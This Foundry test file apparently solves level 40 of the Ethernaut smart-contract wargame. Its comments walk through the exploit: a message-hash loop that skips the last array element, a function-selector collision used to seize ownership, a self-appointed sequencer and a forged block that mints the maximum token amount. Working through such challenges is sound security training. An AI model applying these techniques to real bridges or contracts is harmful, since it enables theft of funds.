// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "test/Ethernaut.t.sol";

interface Level40 {
    struct ProofData {
        bytes stateTrieProof;
        bytes storageTrieProof;
        bytes accountStateRlp;
    }

    function latestBlockHash() external view returns (bytes32);
    function latestBlockNumber() external view returns (uint256);
    function l2StateRoots(uint256) external view returns (bytes32);
    function latestBlockTimestamp() external view returns (uint256);

    function updateSequencer_____76439298743(address) external;
    function transferOwnership_____610165642(address) external;
    function submitNewBlock_____37278985983(bytes memory) external;

    function executeMessage(address, uint256, address[] calldata, bytes[] calldata, uint256, ProofData calldata, uint16)
        external;
}

contract Level40Test is EthernautTest {
    Level40 level40Instance;
    bytes rlpBlockHeader;
    using stdJson for string;

    function testLevel40() public {
        _createLevel("40");

        level40Instance = Level40(levelInstance["40"]);

        // This level is a little tricky.

        // The main thing to assess is whether collisions are possible with the withdrawal hash.
        // Potentially, the avenue for this would be the looping _messageReceivers and _messageData part of the hash.
        // Executing operations is relatively trivial, but it does constrain the contents of those arrays with the onMessageReceived(bytes) function selector.
        // If we can find a collision in the hash, it should be possible to construct proofs to that effect.
        // If all that passes, we are away, and you can mint an amount.

        // Looking at _computeMessageSlot, we can see that there loop always misses the last position in the arrays.
        // So, the message in the last position in the array can be an arbitrary message and give the same hash.

        // Looking at onlyOwner, we can see that this will pass from the contract address, not just the owner.

        // We can't get the contract to call itself unless it matches the onMessageReceived selector.

        // Lets look at the selectors for these.
        {
            console2.log("Function selectors.");
            console2.log("On message received:");
            console2.logBytes4(bytes4(keccak256("onMessageReceived(bytes)")));
            console2.log("Update sequencer:");
            console2.logBytes4(Level40.updateSequencer_____76439298743.selector);
            console2.log("Transfer ownership:");
            console2.logBytes4(Level40.transferOwnership_____610165642.selector);
        }

        // We can see that the selector for onMessageReceived is 0x3a69197e.
        // That is the same as TransferOwnership 0x3a69197e.

        // So, we can set ourselves as the owner.

        // So, to win this level. We need to pass two messages into executeMessage.
        // The first message will set ourselves as the owner.
        // That first message will be included in the message hash.
        // The second and last message won't be included in the hash.
        // The second message will reenter to our contract that is now the owner.
        // We will need to:
        // 1. Set ourselves as the sequencer.
        // 2. Submit a new block that includes that first message.

        // Lets define our message hash variables first.
        address tokenReceiver = address(this);
        uint256 amount = type(uint256).max;
        address[] memory messageReceivers = new address[](2);
        messageReceivers[0] = address(level40Instance);
        messageReceivers[1] = address(this);
        bytes[] memory messageData = new bytes[](2);
        bytes memory callbackData = new bytes(0);
        messageData[0] = abi.encodeWithSelector(Level40.transferOwnership_____610165642.selector, address(this));
        messageData[1] = abi.encodeWithSelector(this.onMessageReceived.selector, callbackData);
        uint256 salt = 0;

        // We can now compute the message hash.
        bytes32 messageHash = _computeMessageSlot(tokenReceiver, amount, messageReceivers, messageData, salt);

        // We now need to construct the state and proofs.
        // Lets log the message hash we need.
        console2.log("Message hash:");
        console2.logBytes32(messageHash);

        // We will use the Rust mpt crate to construct the MPTs and proofs.
        // Load artifacts produced by Rust
        bytes32 storageRoot;
        bytes32 stateRoot;
        bytes memory accountRlp;
        bytes memory storageProof;
        bytes memory stateProof;
        {
            string memory path = string.concat(vm.projectRoot(), "/level_40.log");
            string memory json = vm.readFile(path);

            storageRoot = json.readBytes32(".storage_root");
            stateRoot = json.readBytes32(".state_root");

            accountRlp = json.readBytes(".account_rlp");
            storageProof = json.readBytes(".storage_proof_rlp");
            stateProof = json.readBytes(".state_proof_rlp");
            rlpBlockHeader = json.readBytes(".rlp_block_header");
        }

        // We can now construct our proof data.
        Level40.ProofData memory proofData = Level40.ProofData({
            stateTrieProof: stateProof, storageTrieProof: storageProof, accountStateRlp: accountRlp
        });

        // We can now construct the call to executeMessage.
        level40Instance.executeMessage(tokenReceiver, amount, messageReceivers, messageData, salt, proofData, 1);

        require(_submitLevel("40"));
    }

    function onMessageReceived(bytes memory) external {
        // We are now the owner. So lets update the sequencer to ourselves.
        level40Instance.updateSequencer_____76439298743(address(this));

        // We need to construct the rlp header for our new block.

        {
            // We can use the latest block hash and number as the parent.
            bytes32 parentBlockHash = level40Instance.latestBlockHash();

            // We can now start to construct our block.
            uint256 blockNumber = level40Instance.latestBlockNumber() + 1;
            uint256 timestamp = level40Instance.latestBlockTimestamp() + 1;

            // Lets log those three important values, parent hash, block number, and timestamp.
            console2.log("Parent block hash:");
            console2.logBytes32(parentBlockHash);
            console2.log("Block number:");
            console2.logUint(blockNumber);
            console2.log("Timestamp:");
            console2.logUint(timestamp);

            // We will then use the Rust mpt crate to construct the block header RLP.
        }

        // We can now submit the new block.
        level40Instance.submitNewBlock_____37278985983(rlpBlockHeader);
    }

    // Lets use the faulty compute hash function from the contract so we generate the same hash.
    function _computeMessageSlot(
        address _tokenReceiver,
        uint256 _amount,
        address[] memory _messageReceivers,
        bytes[] memory _messageData,
        uint256 _salt
    ) internal pure returns (bytes32) {
        bytes32 messageReceiversAccumulatedHash;
        bytes32 messageDataAccumulatedHash;
        if (_messageReceivers.length != 0) {
            for (uint256 i; i < _messageReceivers.length - 1; i++) {
                messageReceiversAccumulatedHash =
                    keccak256(abi.encode(messageReceiversAccumulatedHash, _messageReceivers[i]));
                messageDataAccumulatedHash = keccak256(abi.encode(messageDataAccumulatedHash, _messageData[i]));
            }
        }
        return keccak256(
            abi.encode(_tokenReceiver, _amount, messageReceiversAccumulatedHash, messageDataAccumulatedHash, _salt)
        );
    }
}
